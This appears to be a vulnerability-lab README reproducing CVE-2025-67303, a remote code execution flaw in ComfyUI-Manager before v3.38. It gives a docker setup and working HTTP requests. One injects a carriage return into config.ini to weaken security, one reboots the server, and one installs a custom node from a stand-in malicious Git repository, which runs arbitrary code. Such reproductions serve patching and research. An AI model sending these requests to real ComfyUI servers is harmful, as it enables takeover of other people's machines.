# ComfyUI-Manager Remote Code Execution (CVE-2025-67303)

[中文版本(Chinese version)](README.zh-cn.md)

ComfyUI is a professional node-based GUI for Stable Diffusion, serving as a core open-source project in the AI art generation field. ComfyUI-Manager is the official extension manager for ComfyUI, handling the installation of custom nodes, models, and updates.

In versions prior to v3.38, the ComfyUI-Manager's data and configuration directories were not adequately protected by ComfyUI's Web API access controls. An attacker can exploit the `/api/manager/db_mode` endpoint to inject arbitrary configuration parameters, including setting `security_level` to `weak`, which disables security restrictions. Combined with the `/api/manager/reboot` endpoint to restart the service and `/api/customnode/install/git_url` to install malicious custom nodes, attackers can achieve remote code execution on the server. This vulnerability has been fixed in ComfyUI-Manager v3.38 by introducing the "System User Protection API", which migrates all configuration data to a protected directory.

References:

- <https://mp.weixin.qq.com/s/I1_2E9OyxySwWy0KqQdJXg>

## Environment Setup

Execute the following command to start a ComfyUI server with ComfyUI-Manager 3.37:

```
docker compose up -d
```

After the server starts, the ComfyUI web interface will be available at `http://your-ip:8188`.

## Vulnerability Reproduction

First, send a request to the `/api/manager/db_mode` endpoint to inject the `security_level = weak` configuration into the `config.ini` file. The `%0D` in the payload is a carriage return character that allows injecting a new line into the configuration file:

```
GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak HTTP/1.1
Host: your-ip:8188
```

![](1.png)

Next, restart the ComfyUI server by sending a request to `/api/manager/reboot` to make the new configuration take effect:

```
GET /api/manager/reboot HTTP/1.1
Host: your-ip:8188
```

After the server restarts, send a POST request to `/api/customnode/install/git_url` to install a malicious custom node from a Git repository. The malicious code in the custom node will be automatically executed during installation:

```
POST /api/customnode/install/git_url HTTP/1.1
Host: your-ip:8188
Content-Type: application/json

{"url": "https://github.com/example/malicious-custom-node"}
```

![](2.png)

The malicious custom node can contain arbitrary Python code that will be executed with the privileges of the ComfyUI server process.
